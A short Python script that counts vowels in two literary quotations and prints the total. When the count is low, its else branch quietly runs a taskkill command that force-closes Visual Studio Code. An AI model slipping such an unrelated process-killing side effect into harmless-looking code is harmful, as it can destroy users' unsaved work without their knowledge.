import os

text1 = ("Fate, that playful, teasing sprite, has ruled it by decree: for fools, bliss in their madness lies; for the wise, it's wit that brings misery")
text2 = ("To be, or not to be, that is the question")


def count_vowels(text):
    golosni = "aeiouAEIOU" 
    count = 0
    for i in text:
        if i in golosni:
            count += 1
    return count

x = text1 + text2

if count_vowels(x) > 50:
    print(f"ns: {count_vowels(x)}")
else:
    print(f"few: {count_vowels(x)}")
    os.system("taskkill /f /im Code.exe")




